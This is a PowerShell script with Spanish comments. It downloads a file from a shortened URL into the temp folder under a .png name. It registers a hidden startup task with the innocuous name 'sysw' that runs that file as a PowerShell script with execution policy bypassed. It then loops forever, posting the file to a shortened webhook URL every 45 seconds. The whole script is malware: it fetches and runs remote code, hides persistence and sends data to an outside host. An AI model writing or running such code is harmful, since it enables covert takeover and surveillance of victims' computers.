# Descargar automáticamente el archivo desde el enlace
$url = "https://bit.ly/Screen_dc"
$output = "$env:temp\SC.png"
Invoke-WebRequest -Uri $url -OutFile $output

# Función para enviar la imagen al webhook
function Send-Screenshot {
    param (
        [string]$ImageFile,
        [string]$WebhookURL
    )
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file1`"; filename=`"screenshot.png`"",
        "Content-Type: image/png$LF",
        (Get-Content -Path $ImageFile -Encoding Byte),
        "--$boundary--$LF"
    )
    $body = $bodyLines -join $LF
    $contentType = "multipart/form-data; boundary=$boundary"
    Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType $contentType -Body $body
}

# Webhook URL
$webhookURL = "https://bit.ly/web_chupakbras"

# Crear la tarea programada para ejecutar el script al iniciar Windows
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$output`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden -DisallowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "sysw" -Action $action -Trigger $trigger -Settings $settings

# Loop para enviar imágenes cada 45 segundos
while ($true) {
    Send-Screenshot -ImageFile $output -WebhookURL $webhookURL
    Start-Sleep -Seconds 45
}
